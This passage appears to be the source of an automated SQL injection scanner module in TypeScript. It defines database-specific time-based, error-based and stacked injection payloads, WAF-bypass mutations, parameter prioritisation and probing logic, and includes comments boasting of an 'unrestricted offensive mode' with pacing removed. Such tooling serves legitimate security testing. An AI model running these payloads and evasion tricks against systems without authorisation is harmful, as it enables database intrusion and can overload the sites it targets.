import { SQL_PAYLOADS, SQL_ERROR_PATTERNS } from "../payloads";
import { globalPayloadRepository, Payload, DatabaseType as PayloadDbType, ContextAnalyzer, ContextAnalysis } from "../payload-repository";
import { makeRequest, RequestResult, sleep, compareResponses, injectPayload, extractParameters, randomString, hashString, negativeCache, tieredConcurrency, TrafficLogger } from "../utils";
import { InsertVulnerability } from "@shared/schema";
import { DefenseAwareness, EncodingStrategy, WAFProfile, RateLimitStatus } from "../defense-awareness";
import * as cheerio from "cheerio";
import { createHash } from "crypto";

const AGGRESSIVE_CONCURRENCY = 20;
const HEAVY_PAYLOAD_MODE = true;

// Export DatabaseType for use in other modules
export type DatabaseType = "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" | "unknown";
type ParameterType = "numeric" | "string" | "json" | "header" | "hidden";
type ReflectionBehavior = "echoed" | "processed" | "ignored";
type PayloadClass = "error" | "union" | "blind-time" | "blind-boolean" | "stacked";
type SQLPriority = "high" | "medium" | "low";
type ConfidenceLevel = "CONFIRMED" | "HIGHLY_LIKELY" | "POTENTIAL" | "REJECTED";

interface ParameterContext {
  name: string;
  type: ParameterType;
  inferredBackend: DatabaseType;
  reflectionBehavior: ReflectionBehavior;
  originalValue: string;
  sqlPriority: SQLPriority;
}

interface LatencyBaseline {
  samples: number[];
  mean: number;
  stdDev: number;
  threshold: number;
}

interface BaselineMetrics {
  status: number;
  size: number;
  avgTime: number;
  maxTime: number;
  minTime: number;
  body: string;
  bodyHash: string;
  normalizedBody: string;
  normalizedHash: string;
  latencyBaseline: LatencyBaseline;
  responses: RequestResult[];
}

interface PayloadClassResult {
  class: PayloadClass;
  success: boolean;
  payload: string;
  evidence: string;
  confirmations: number;
}

interface StabilityVerification {
  attempts: number;
  successes: number;
  stabilityScore: number;
  isStable: boolean;
  responses: RequestResult[];
}

interface WorkflowStep {
  name: string;
  url: string;
  method: "GET" | "POST";
  parameters: { name: string; value: string }[];
  cookies?: Record<string, string>;
  headers?: Record<string, string>;
}

interface WorkflowSession {
  id: string;
  steps: WorkflowStep[];
  cookies: Record<string, string>;
  sessionToken: string | null;
  csrfToken: string | null;
}

interface SequenceTestResult {
  workflowId: string;
  stepIndex: number;
  stepName: string;
  vulnerable: boolean;
  payload: string;
  parameter: string;
}

interface AdaptiveProbeResult {
  hasDifferentialBehavior: boolean;
  confidence: number;
  trueHash: string;
  falseHash: string;
  shouldEscalate: boolean;
  evidence: string;
}

interface SQLiResult {
  vulnerable: boolean;
  type: PayloadClass;
  payload: string;
  evidence: string;
  parameter: string;
  confidence: number;
  confidenceLevel: ConfidenceLevel;
  verificationStatus: "confirmed" | "potential";
  verificationDetails: string;
  dbType: DatabaseType;
  wafDetected: boolean;
  confirmationCount: number;
  baselineComparison: string;
  stabilityScore: number;
  payloadClassesAttempted: PayloadClass[];
  payloadClassesSucceeded: PayloadClass[];
  sequenceContext?: {
    workflowId: string;
    stepIndex: number;
    stepName: string;
  };
}

const DB_ERROR_PATTERNS: Record<DatabaseType, RegExp[]> = {
  mysql: [
    /SQL syntax.*MySQL/i,
    /mysql_fetch/i,
    /Warning.*mysql_/i,
    /MySqlClient\./i,
    /MySqlException/i,
    /com\.mysql\.jdbc/i,
    /You have an error in your SQL syntax/i,
    /Incorrect syntax near/i,
  ],
  postgresql: [
    /PostgreSQL.*ERROR/i,
    /pg_query/i,
    /unterminated quoted string/i,
    /PG::SyntaxError/i,
    /org\.postgresql/i,
    /Npgsql\.NpgsqlException/i,
    /ERROR:\s+syntax error at or near/i,
  ],
  mssql: [
    /SQL Server/i,
    /ODBC.*SQL Server/i,
    /Unclosed quotation mark/i,
    /Microsoft.*ODBC/i,
    /SQLServer JDBC Driver/i,
    /com\.microsoft\.sqlserver/i,
    /Msg \d+, Level \d+, State \d+/i,
  ],
  oracle: [
    /ORA-\d{5}/i,
    /Oracle error/i,
    /PL\/SQL/i,
    /oracle\.jdbc/i,
    /OracleException/i,
  ],
  sqlite: [
    /SQLite.*error/i,
    /sqlite3\./i,
    /SQLITE_ERROR/i,
    /System\.Data\.SQLite/i,
    /near ".*": syntax error/i,
  ],
  unknown: [],
};

const DB_SPECIFIC_PAYLOADS: Record<DatabaseType, { time: string[]; error: string[]; stacked: string[] }> = {
  mysql: {
    time: ["' AND SLEEP({DELAY})--", "' OR SLEEP({DELAY})--", "1' AND SLEEP({DELAY}) AND '1'='1"],
    error: ["' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "' AND updatexml(1,concat(0x7e,version()),1)--"],
    stacked: [],
  },
  postgresql: {
    time: ["'; SELECT pg_sleep({DELAY})--", "' AND pg_sleep({DELAY})--", "1; SELECT pg_sleep({DELAY})--"],
    error: ["' AND 1=CAST((SELECT version()) AS int)--"],
    stacked: ["'; SELECT pg_sleep({DELAY});--", "1; SELECT pg_sleep({DELAY});--"],
  },
  mssql: {
    time: ["'; WAITFOR DELAY '0:0:{DELAY}'--", "1; WAITFOR DELAY '0:0:{DELAY}'--"],
    error: ["' AND 1=CONVERT(int, @@version)--"],
    stacked: ["'; WAITFOR DELAY '0:0:{DELAY}';--", "1; WAITFOR DELAY '0:0:{DELAY}';--"],
  },
  oracle: {
    time: ["' AND DBMS_LOCK.SLEEP({DELAY})--", "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT DBMS_LOCK.SLEEP({DELAY}) FROM DUAL))--"],
    error: ["' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"],
    stacked: [],
  },
  sqlite: {
    time: ["' AND randomblob(500000000)--"],
    error: ["' AND 1=sqlite_version()--"],
    stacked: [],
  },
  unknown: {
    time: ["' AND SLEEP({DELAY})--", "'; WAITFOR DELAY '0:0:{DELAY}'--", "'; SELECT pg_sleep({DELAY})--"],
    error: ["'", "\"", "' OR '1'='1"],
    stacked: [],
  },
};

const HIGH_PRIORITY_PARAMS = [
  /^id$/i, /^uid$/i, /^user_id$/i, /^userid$/i, /^user$/i,
  /^search$/i, /^q$/i, /^query$/i, /^keyword$/i, /^term$/i,
  /^sort$/i, /^order$/i, /^orderby$/i, /^sortby$/i,
  /^filter$/i, /^category$/i, /^cat$/i, /^type$/i,
  /^page$/i, /^limit$/i, /^offset$/i, /^start$/i, /^count$/i,
  /^item$/i, /^product$/i, /^article$/i, /^post$/i, /^pid$/i,
  /^where$/i, /^column$/i, /^field$/i, /^table$/i,
];

const MEDIUM_PRIORITY_PARAMS = [
  /^name$/i, /^title$/i, /^email$/i, /^username$/i,
  /^date$/i, /^from$/i, /^to$/i, /^year$/i, /^month$/i,
  /^status$/i, /^state$/i, /^action$/i, /^view$/i,
  /^value$/i, /^data$/i, /^content$/i, /^text$/i,
];

const LOW_PRIORITY_PARAMS = [
  /^file$/i, /^path$/i, /^dir$/i, /^url$/i, /^src$/i,
  /^token$/i, /^csrf$/i, /^nonce$/i, /^hash$/i, /^signature$/i,
  /^callback$/i, /^jsonp$/i, /^format$/i, /^lang$/i,
  /^theme$/i, /^style$/i, /^css$/i, /^js$/i,
];

const WAF_BYPASS_MUTATIONS: Record<string, (payload: string) => string[]> = {
  commentSplit: (payload: string) => [
    payload.replace(/AND/gi, "/*!50000AND*/"),
    payload.replace(/OR/gi, "/*!50000OR*/"),
    payload.replace(/SELECT/gi, "/*!50000SELECT*/"),
    payload.replace(/UNION/gi, "/*!50000UNION*/"),
    payload.replace(/ /g, "/**/"),
  ],
  caseVariation: (payload: string) => [
    payload.replace(/and/gi, "aNd"),
    payload.replace(/or/gi, "oR"),
    payload.replace(/select/gi, "SeLeCt"),
    payload.replace(/union/gi, "UnIoN"),
  ],
  commentTerminators: (payload: string) => [
    payload.replace(/--$/, "--+-"),
    payload.replace(/--$/, "#"),
    payload.replace(/--$/, ";--"),
    payload.replace(/--$/, "-- -"),
  ],
  urlEncode: (payload: string) => [
    encodeURIComponent(payload),
    payload.replace(/'/g, "%27").replace(/ /g, "%20"),
  ],
  doubleEncode: (payload: string) => [
    payload.replace(/'/g, "%2527").replace(/ /g, "%2520"),
  ],
};

const MAX_URLS_TO_TEST = 1000; // Zero-Speed Directive: Test all discovered URLs
const BASELINE_SAMPLE_COUNT = 5;
const MIN_CONFIRMATIONS = 3;
const TIME_DELAYS = [2, 5, 8]; // Zero-Speed Directive: Full delay coverage
const TIME_VARIANCE_THRESHOLD = 0.3;
const TIME_BASED_REQUIRED_SUCCESS = 3;
const MIN_PAYLOAD_CLASSES_FOR_CONFIRM = 3;
const STABILITY_TEST_COUNT = 3;
const STABILITY_THRESHOLD = 66;
const BODY_LENGTH_TOLERANCE = 0.05;

const CONFIDENCE_THRESHOLDS = {
  CONFIRMED: { minClasses: 3, minStability: 80, minConfidence: 95 },
  HIGHLY_LIKELY: { minClasses: 2, minStability: 60, minConfidence: 75 },
  POTENTIAL: { minClasses: 1, minStability: 0, minConfidence: 50 },
};

// FIXED: Realistic phase timeout limits - prevent deadlock
const BASELINE_PHASE_TIMEOUT = 5 * 60 * 1000;  // 5 minutes
const ERROR_PHASE_TIMEOUT = 10 * 60 * 1000;    // 10 minutes
const BOOLEAN_PHASE_TIMEOUT = 10 * 60 * 1000;  // 10 minutes
const TIME_PHASE_TIMEOUT = 10 * 60 * 1000;     // 10 minutes
const PARAMETER_TOTAL_TIMEOUT = 15 * 60 * 1000; // 15 minutes per parameter

// FIXED: Reasonable payload limits - prevent endless testing
const MAX_TIME_BASED_ATTEMPTS = 30;    // Test 30 time-based payloads max
const EARLY_REJECTION_THRESHOLD = 20;  // Stop early if clear rejection pattern

// Known vulnerable targets for self-validation (UPDATED Jan 2026)
// These targets MUST be detected as vulnerable - silence is failure
const KNOWN_VULNERABLE_TARGETS = [
  {
    url: "https://hackazon.webscantest.com/product/view?id=1",
    parameter: "id",
    expectedType: "error" as PayloadClass,
    description: "Hackazon - product view with vulnerable id parameter"
  },
  {
    url: "https://juice-shop.herokuapp.com/rest/products/search?q=test",
    parameter: "q",
    expectedType: "error" as PayloadClass,
    description: "OWASP Juice Shop - product search with vulnerable q parameter"
  }
];

// AGGRESSIVE SQL MODE: For validation targets, lower thresholds
// Any repeatable signal = detection (silence on known vulnerable targets is UNACCEPTABLE)
const AGGRESSIVE_MODE_THRESHOLDS = {
  CONFIRMED: { minClasses: 1, minStability: 0, minConfidence: 60 },
  HIGHLY_LIKELY: { minClasses: 1, minStability: 0, minConfidence: 50 },
  POTENTIAL: { minClasses: 1, minStability: 0, minConfidence: 30 },
};

// Check if target is a known vulnerable test environment
function isKnownVulnerableTarget(url: string): boolean {
  const normalizedUrl = url.toLowerCase();
  return KNOWN_VULNERABLE_TARGETS.some(t => normalizedUrl.includes(new URL(t.url).hostname.toLowerCase()));
}

const SELF_VALIDATION_TIMEOUT = 60000; // 1 minute for validation

interface ContextProbeResult {
  dbType: string;
  context: string;
  singleQuoteError: boolean;
  doubleQuoteError: boolean;
  parenthesisError: boolean;
  numericMathWorks: boolean;
  detectedPatterns: string[];
}

const CONTEXT_PROBE_PAYLOADS = {
  singleQuote: "'",
  doubleQuote: '"',
  parenthesis: ")",
  numericMath: "1*2",
  dbTriggers: {
    mysql: "' AND EXTRACTVALUE(1,1)--",
    postgresql: "'::int",
    mssql: "' CONVERT(int,1)--",
    oracle: "' AND ROWNUM=1--",
    sqlite: "' AND sqlite_version()--",
  },
};

// DOM Tree Hash Structural Comparison Types
interface DOMStructureNode {
  tag: string;
  classes: string[];
  depth: number;
  childCount: number;
}

interface DOMStructureAnalysis {
  hash: string;
  nodes: DOMStructureNode[];
  elementCounts: Record<string, number>;
  maxDepth: number;
  totalElements: number;
  classFingerprint: string;
}

interface DOMDiffResult {
  structurallyDifferent: boolean;
  confidence: number;
  missingElements: string[];
  addedElements: string[];
  changedCounts: { tag: string; trueCount: number; falseCount: number }[];
  depthChange: number;
  evidence: string;
}

/**
 * Computes a structural hash of the DOM tree, focusing on element types,
 * nesting depth, and class names while ignoring volatile text content.
 */
function computeDOMHash(html: string): DOMStructureAnalysis {
  const $ = cheerio.load(html);
  
  const nodes: DOMStructureNode[] = [];
  const elementCounts: Record<string, number> = {};
  let maxDepth = 0;
  let totalElements = 0;
  const classesSet = new Set<string>();
  
  // Walk the DOM tree and extract structural information
  function walkDOM(element: any, depth: number): void {
    if (element.type !== 'tag') return;
    
    const tagName = element.tagName?.toLowerCase() || '';
    if (!tagName) return;
    
    // Skip script, style, and other non-structural elements
    if (['script', 'style', 'noscript', 'link', 'meta', 'head', 'comment'].includes(tagName)) {
      return;
    }
    
    totalElements++;
    maxDepth = Math.max(maxDepth, depth);
    
    // Count element types
    elementCounts[tagName] = (elementCounts[tagName] || 0) + 1;
    
    // Extract class names (for structural fingerprinting)
    const classAttr = element.attribs?.class || '';
    const classes = classAttr.split(/\s+/).filter((c: any) => c.length > 0 && !c.match(/^[a-f0-9]{8,}$/i)); // Filter out dynamic hash-like classes
    classes.forEach((c: any) => classesSet.add(c));
    
    // Count children
    const children = element.children?.filter((c: any) => c.type === 'tag') || [];
    
    nodes.push({
      tag: tagName,
      classes: classes.sort(),
      depth,
      childCount: children.length,
    });
    
    // Recurse into children
    children.forEach((child: any) => {
      if (child.type === 'tag') {
        walkDOM(child as any, depth + 1);
      }
    });
  }
  
  // Start walking from body (or root if no body)
  const body = $('body')[0];
  const root = body || $.root()[0];
  
  if (root && root.type === 'tag') {
    walkDOM(root, 0);
  } else if (root && root.children) {
    root.children.forEach((child: any) => {
      if (child.type === 'tag') {
        walkDOM(child as any, 0);
      }
    });
  }
  
  // Create a normalized structural representation
  const structureString = nodes.map(n => 
    `${n.tag}:${n.depth}:${n.childCount}:${n.classes.join(',')}`
  ).join('|');
  
  // Create class fingerprint (sorted, deduplicated)
  const sortedClasses = Array.from(classesSet).sort();
  const classFingerprint = sortedClasses.join(',');
  
  // Hash the structure
  const hash = createHash('sha256')
    .update(structureString)
    .digest('hex')
    .substring(0, 16);
  
  return {
    hash,
    nodes,
    elementCounts,
    maxDepth,
    totalElements,
    classFingerprint,
  };
}

/**
 * Compare two DOM structures and identify specific differences
 * Returns detailed evidence about what changed between TRUE and FALSE conditions
 */
function compareDOMStructures(trueHtml: string, falseHtml: string): DOMDiffResult {
  const trueStructure = computeDOMHash(trueHtml);
  const falseStructure = computeDOMHash(falseHtml);
  
  const result: DOMDiffResult = {
    structurallyDifferent: false,
    confidence: 0,
    missingElements: [],
    addedElements: [],
    changedCounts: [],
    depthChange: trueStructure.maxDepth - falseStructure.maxDepth,
    evidence: '',
  };
  
  // Quick check: if hashes are identical, structures are identical
  if (trueStructure.hash === falseStructure.hash) {
    return result;
  }
  
  // Analyze element count differences
  const allTags = new Set([
    ...Object.keys(trueStructure.elementCounts),
    ...Object.keys(falseStructure.elementCounts),
  ]);
  
  const significantTags = ['div', 'span', 'tr', 'td', 'th', 'li', 'a', 'p', 'article', 'section', 'table', 'tbody', 'form', 'input'];
  
  for (const tag of Array.from(allTags)) {
    const trueCount = trueStructure.elementCounts[tag] || 0;
    const falseCount = falseStructure.elementCounts[tag] || 0;
    
    if (trueCount !== falseCount) {
      result.changedCounts.push({ tag, trueCount, falseCount });
      
      // Check for significant elements disappearing
      if (significantTags.includes(tag)) {
        if (trueCount > falseCount) {
          result.missingElements.push(`<${tag}> (${trueCount} → ${falseCount})`);
        } else {
          result.addedElements.push(`<${tag}> (${falseCount} → ${trueCount})`);
        }
      }
    }
  }
  
  // Calculate confidence based on structural differences
  let confidence = 0;
  
  // Missing data rows is a strong indicator
  const trMissing = result.changedCounts.find(c => c.tag === 'tr');
  if (trMissing && trMissing.trueCount > trMissing.falseCount) {
    confidence += 40; // Table rows disappeared - strong SQL indicator
  }
  
  // Missing divs/spans with data
  const divMissing = result.changedCounts.find(c => c.tag === 'div');
  const spanMissing = result.changedCounts.find(c => c.tag === 'span');
  if ((divMissing && divMissing.trueCount > divMissing.falseCount) ||
      (spanMissing && spanMissing.trueCount > spanMissing.falseCount)) {
    confidence += 25;
  }
  
  // Links disappeared (common in result lists)
  const linkMissing = result.changedCounts.find(c => c.tag === 'a');
  if (linkMissing && linkMissing.trueCount > linkMissing.falseCount) {
    confidence += 20;
  }
  
  // Total element count difference
  const elementCountDiff = Math.abs(trueStructure.totalElements - falseStructure.totalElements);
  if (elementCountDiff > 5) {
    confidence += Math.min(15, elementCountDiff);
  }
  
  // Depth change (page structure fundamentally different)
  if (Math.abs(result.depthChange) > 2) {
    confidence += 10;
  }
  
  // Hash differs but similar element counts = subtle structure change
  if (trueStructure.hash !== falseStructure.hash && result.changedCounts.length < 3) {
    confidence += 5;
  }
  
  result.confidence = Math.min(100, confidence);
  result.structurallyDifferent = result.changedCounts.length > 0 || result.depthChange !== 0 || 
                                  trueStructure.hash !== falseStructure.hash;
  
  // Build evidence string
  const evidenceParts: string[] = [];
  
  if (result.missingElements.length > 0) {
    evidenceParts.push(`DOM structural diff: ${result.missingElements.slice(0, 3).join(', ')} disappeared in FALSE condition`);
  }
  
  if (result.addedElements.length > 0) {
    evidenceParts.push(`Elements added in FALSE: ${result.addedElements.slice(0, 2).join(', ')}`);
  }
  
  if (result.depthChange !== 0) {
    evidenceParts.push(`DOM depth change: ${trueStructure.maxDepth} → ${falseStructure.maxDepth}`);
  }
  
  if (elementCountDiff > 0) {
    evidenceParts.push(`Element count diff: ${trueStructure.totalElements} → ${falseStructure.totalElements}`);
  }
  
  if (evidenceParts.length === 0 && trueStructure.hash !== falseStructure.hash) {
    evidenceParts.push(`DOM hash diff: ${trueStructure.hash} vs ${falseStructure.hash}`);
  }
  
  result.evidence = evidenceParts.join('; ');
  
  return result;
}

export class SQLiModule {
  private targetUrl: string;
  private foundVulnerabilities: SQLiResult[] = [];
  private onLog: (level: string, message: string) => Promise<void>;
  private onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>;
  private foundSqliForParam: Set<string> = new Set();
  private detectedDbType: DatabaseType = "unknown";
  private detectedContext: string = "unknown";
  private requestDelay: number = 100;
  private defenseAwareness: DefenseAwareness;
  private workflowSessions: Map<string, WorkflowSession> = new Map();
  private payloadClassResults: Map<string, PayloadClassResult[]> = new Map();
  private effectivePayloads: Map<string, string[]> = new Map();
  private contextProbeCache: Map<string, ContextProbeResult> = new Map();
  private isCancelled: () => boolean;
  private abortSignal?: AbortSignal;
  private trafficLogger?: TrafficLogger;
  private onResponse?: (result: RequestResult) => void;

  constructor(
    targetUrl: string,
    onLog: (level: string, message: string) => Promise<void>,
    onVuln: (vuln: Omit<InsertVulnerability, "scanId">) => Promise<void>,
    defenseAwareness?: DefenseAwareness,
    private executionController?: { 
      recordRequest: (parameter?: string) => Promise<void>;
      setCurrentPayload?: (payload: string, payloadType: string, confidence: number) => void;
      setDetectedDbType?: (dbType: string) => void;
      setDetectedContext?: (context: string) => void;
      incrementParametersTested?: () => void;
      incrementPayloadsTested?: () => void;
      heartbeat?: () => void;
    },
    isCancelled?: () => boolean,
    abortSignal?: AbortSignal,
    trafficLogger?: TrafficLogger,
    onResponse?: (result: RequestResult) => void
  ) {
    this.targetUrl = targetUrl;
    this.onLog = onLog;
    this.onVuln = onVuln;
    this.defenseAwareness = defenseAwareness || new DefenseAwareness(
      onLog,
      executionController ? () => (executionController as any).recordBlock?.() : undefined
    );
    this.isCancelled = isCancelled || (() => false);
    this.abortSignal = abortSignal;
    this.trafficLogger = trafficLogger;
    this.onResponse = onResponse;
  }

  private async trackAndPace(parameter?: string, url?: string): Promise<void> {
    try {
      if (this.executionController) {
        await this.executionController.recordRequest(parameter);
        // Heartbeat: Keep scan alive and prevent orphaning
        this.executionController.heartbeat?.();
        // War Room: Track RPS and current target
        if ((this.executionController as any).trackRequestForRPS) {
          (this.executionController as any).trackRequestForRPS();
        }
        if (url && parameter && (this.executionController as any).setCurrentTarget) {
          (this.executionController as any).setCurrentTarget(url, parameter);
        }
      }
    } catch (error) {
      await this.onLog("warn", `[Pacing] Request tracking error: ${error}`).catch(() => {});
    }
    
    // UNRESTRICTED OFFENSIVE MODE: No delays
    // Removed: if (this.requestDelay > 0) { await sleep(this.requestDelay); }
  }

  private checkCancellation(): boolean {
    return this.isCancelled() || (this.abortSignal?.aborted ?? false);
  }

  private async request(url: string, options: Parameters<typeof makeRequest>[1] = {}): Promise<ReturnType<typeof makeRequest>> {
    const result = await makeRequest(url, { ...options, signal: this.abortSignal });
    
    if (this.onResponse) {
      this.onResponse(result);
    }
    
    return result;
  }

  private async requestWithTrafficLog(
    url: string, 
    options: Parameters<typeof makeRequest>[1] = {},
    trafficOptions?: {
      payload?: string;
      parameterName?: string;
      payloadType?: string;
      encodingUsed?: string;
      detectionResult?: string;
      confidenceScore?: number;
    }
  ): Promise<ReturnType<typeof makeRequest>> {
    const result = await this.request(url, options);
    
    if (this.trafficLogger) {
      await this.trafficLogger.logRequest(
        url,
        options.method || "GET",
        result,
        {
          payload: trafficOptions?.payload,
          parameterName: trafficOptions?.parameterName,
          payloadType: trafficOptions?.payloadType,
          encodingUsed: trafficOptions?.encodingUsed,
          detectionResult: trafficOptions?.detectionResult,
          confidenceScore: trafficOptions?.confidenceScore,
          headers: options.headers,
        }
      );
    }
    
    return result;
  }

  async scan(urlsToTest: string[]): Promise<SQLiResult[]> {
    await this.onLog("info", "Starting SQL-First Engine scan with adaptive detection...");
    
    const urlsToProcess = urlsToTest.slice(0, MAX_URLS_TO_TEST);
    await this.onLog("info", `Testing ${urlsToProcess.length} URLs (limited from ${urlsToTest.length})`);
    
    try {
      // Test workflows with timeout protection
      const workflows = this.detectWorkflows(urlsToProcess);
      if (workflows.length > 0) {
        await this.onLog("info", `[Sequence] Detected ${workflows.length} potential workflows for sequence testing`);
        for (const workflow of workflows) {
          if (this.checkCancellation()) {
            await this.onLog("info", "[Cancelled] Scan aborted during workflow testing");
            return this.foundVulnerabilities;
          }
          
          // Add timeout protection for workflow testing
          try {
            await Promise.race([
              this.testWorkflow(workflow),
              new Promise((_, reject) => setTimeout(() => reject(new Error('Workflow timeout')), 30000))
            ]);
          } catch (error) {
            await this.onLog("warn", `[Workflow] Timeout or error testing workflow: ${error}`);
          }
        }
      }

      // Sort parameters by priority for better detection
      const urlsByPriority = urlsToProcess.sort((a, b) => {
        const scoreA = this.getParameterPriorityScore(a);
        const scoreB = this.getParameterPriorityScore(b);
        return scoreB - scoreA; // Higher priority first
      });

      // Test URLs with proper timeout handling
      for (const url of urlsByPriority) {
        if (this.checkCancellation()) {
          await this.onLog("info", "[Cancelled] Scan aborted during URL processing");
          break;
        }
        
        if (this.defenseAwareness.isBlocked()) {
          await this.onLog("warn", "[Defense] Scanning blocked - IP or CAPTCHA block detected");
          await sleep(5000); // Wait before retry
          continue;
        }

        const params = extractParameters(url);
        
        try {
          if (params.length === 0) {
            // Add standard test parameters
            const testUrls = [
              `${url}?id=1`,
              `${url}?page=1`,
              `${url}?search=test`,
            ];
            
            for (const testUrl of testUrls.slice(0, 2)) {
              if (this.checkCancellation()) break;
              try {
                await Promise.race([
                  this.testUrlWithAdaptiveDetection(testUrl),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('URL timeout')), 60000))
                ]);
              } catch (error) {
                if (error instanceof Error && error.message !== 'URL timeout') {
                  await this.onLog("debug", `[URL] Error testing ${testUrl}: ${error.message}`);
                }
              }
            }
          } else {
            // Test URL with parameters
            try {
              await Promise.race([
                this.testUrlWithAdaptiveDetection(url),
                new Promise((_, reject) => setTimeout(() => reject(new Error('URL timeout')), 60000))
              ]);
            } catch (error) {
              if (error instanceof Error && error.message !== 'URL timeout') {
                await this.onLog("debug", `[URL] Error testing ${url}: ${error.message}`);
              }
            }
          }
        } catch (error) {
          await this.onLog("warn", `[URL] Failed to test ${url}: ${error}`);
        }
      }

      const defenseSummary = this.defenseAwareness.getDefenseSummary();
      if (defenseSummary.wafDetected) {
        await this.onLog("info", `[Defense Summary] WAF: ${defenseSummary.wafVendor || "Unknown"}, Rate limited: ${defenseSummary.rateLimitDetected}, Final delay: ${defenseSummary.currentDelay}ms`);
      }
    } catch (error) {
      await this.onLog("error", `[Scan] Fatal error during SQL scan: ${error}`);
    }

    return this.foundVulnerabilities;
  }

  private getParameterPriorityScore(url: string): number {
    let score = 0;
    const params = extractParameters(url);
    for (const param of params) {
      if (HIGH_PRIORITY_PARAMS.some(p => p.test(param.name))) score += 10;
      else if (MEDIUM_PRIORITY_PARAMS.some(p => p.test(param.name))) score += 5;
      else if (!LOW_PRIORITY_PARAMS.some(p => p.test(param.name))) score += 2;
    }
    return score;
  }

  async selfValidate(): Promise<{ passed: boolean; details: string; findings: SQLiResult[] }> {
    await this.onLog("info", "[Self-Validation] Starting validation against known vulnerable targets...");
    
    const results: { target: typeof KNOWN_VULNERABLE_TARGETS[0]; found: boolean; result?: SQLiResult }[] = [];
    
    for (const target of KNOWN_VULNERABLE_TARGETS) {
      await this.onLog("info", `[Self-Validation] Testing ${target.url}...`);
      
      const startTime = Date.now();
      let found = false;
      
      try {
        // Run scan with timeout
        const scanPromise = this.testUrlWithAdaptiveDetection(target.url);
        const timeoutPromise = new Promise<void>((_, reject) => 
          setTimeout(() => reject(new Error("Validation timeout")), SELF_VALIDATION_TIMEOUT)
        );
        
        await Promise.race([scanPromise, timeoutPromise]);
        
        // Check if we found the expected vulnerability
        const matchingVuln = this.foundVulnerabilities.find(v => 
          v.parameter === target.parameter && v.vulnerable
        );
        
        if (matchingVuln) {
          found = true;
          results.push({ target, found: true, result: matchingVuln });
          await this.onLog("info", `[Self-Validation] SUCCESS: Found ${matchingVuln.type} SQLi on '${target.parameter}' (${matchingVuln.confidence}% confidence)`);
        } else {
          results.push({ target, found: false });
          await this.onLog("warn", `[Self-Validation] FAILED: Did not detect expected SQLi on '${target.parameter}'`);
        }
      } catch (error) {
        results.push({ target, found: false });
        await this.onLog("error", `[Self-Validation] ERROR testing ${target.url}: ${error}`);
      }
      
      const elapsed = Date.now() - startTime;
      await this.onLog("info", `[Self-Validation] Test completed in ${(elapsed / 1000).toFixed(1)}s`);
    }
    
    const passed = results.every(r => r.found);
    const passCount = results.filter(r => r.found).length;
    const totalCount = results.length;
    
    const details = passed 
      ? `All ${totalCount} validation tests passed`
      : `${passCount}/${totalCount} validation tests passed - engine may need tuning`;
      
    await this.onLog(passed ? "info" : "warn", `[Self-Validation] ${details}`);
    
    return {
      passed,
      details,
      findings: results.filter(r => r.result).map(r => r.result!)
    };
  }

  async runContextProbe(url: string, paramName: string): Promise<{ dbType: string; context: string }> {
    await this.onLog("info", `[Fingerprint] Starting pre-scan context probe for '${paramName}'...`);
    
    const probeResult: ContextProbeResult = {
      dbType: "unknown",
      context: "unknown",
      singleQuoteError: false,
      doubleQuoteError: false,
      parenthesisError: false,
      numericMathWorks: false,
      detectedPatterns: [],
    };

    const cacheKey = `${url}:${paramName}`;
    if (this.contextProbeCache.has(cacheKey)) {
      const cached = this.contextProbeCache.get(cacheKey)!;
      await this.onLog("info", `[Fingerprint] Using cached result: DB=${cached.dbType}, context=${cached.context}`);
      return { dbType: cached.dbType, context: cached.context };
    }

    // Get baseline response for comparison
    const params = extractParameters(url);
    const originalValue = params.find(p => p.name === paramName)?.value || "";
    const baselineUrl = url;
    const baselineResponse = await this.request(baselineUrl, { timeout: 5000 });
    const baselineHash = baselineResponse.error ? "" : hashString(baselineResponse.body);
    const baselineStatus = baselineResponse.status;

    // PROBE 1: Single quote test
    await this.onLog("info", `[Fingerprint] Probe 1/5: Testing single quote context...`);
    const singleQuotePayload = originalValue + CONTEXT_PROBE_PAYLOADS.singleQuote;
    const sqResponse = await this.request(injectPayload(url, paramName, singleQuotePayload), { timeout: 5000 });
    if (!sqResponse.error) {
      const sqPatterns = this.extractErrorPatterns(sqResponse.body);
      if (sqPatterns.patterns.length > 0) {
        probeResult.singleQuoteError = true;
        probeResult.detectedPatterns.push(...sqPatterns.patterns);
        if (sqPatterns.dbType !== "unknown") {
          probeResult.dbType = sqPatterns.dbType;
        }
      }
      // Check if response differs from baseline
      if (sqResponse.status !== baselineStatus || hashString(sqResponse.body) !== baselineHash) {
        probeResult.singleQuoteError = true;
      }
    }
    await sleep(50);

    // PROBE 2: Double quote test
    await this.onLog("info", `[Fingerprint] Probe 2/5: Testing double quote context...`);
    const doubleQuotePayload = originalValue + CONTEXT_PROBE_PAYLOADS.doubleQuote;
    const dqResponse = await this.request(injectPayload(url, paramName, doubleQuotePayload), { timeout: 5000 });
    if (!dqResponse.error) {
      const dqPatterns = this.extractErrorPatterns(dqResponse.body);
      if (dqPatterns.patterns.length > 0) {
        probeResult.doubleQuoteError = true;
        probeResult.detectedPatterns.push(...dqPatterns.patterns);
        if (dqPatterns.dbType !== "unknown" && probeResult.dbType === "unknown") {
          probeResult.dbType = dqPatterns.dbType;
        }
      }
      if (dqResponse.status !== baselineStatus || hashString(dqResponse.body) !== baselineHash) {
        probeResult.doubleQuoteError = true;
      }
    }
    await sleep(50);

    // PROBE 3: Parenthesis test
    await this.onLog("info", `[Fingerprint] Probe 3/5: Testing parenthesis context...`);
    const parenPayload = originalValue + CONTEXT_PROBE_PAYLOADS.parenthesis;
    const parenResponse = await this.request(injectPayload(url, paramName, parenPayload), { timeout: 5000 });
    if (!parenResponse.error) {
      const parenPatterns = this.extractErrorPatterns(parenResponse.body);
      if (parenPatterns.patterns.length > 0) {
        probeResult.parenthesisError = true;
        probeResult.detectedPatterns.push(...parenPatterns.patterns);
        if (parenPatterns.dbType !== "unknown" && probeResult.dbType === "unknown") {
          probeResult.dbType = parenPatterns.dbType;
        }
      }
      if (parenResponse.status !== baselineStatus || hashString(parenResponse.body) !== baselineHash) {
        probeResult.parenthesisError = true;
      }
    }
    await sleep(50);

    // PROBE 4: Numeric math test (1*2 should equal 2 if in numeric context)
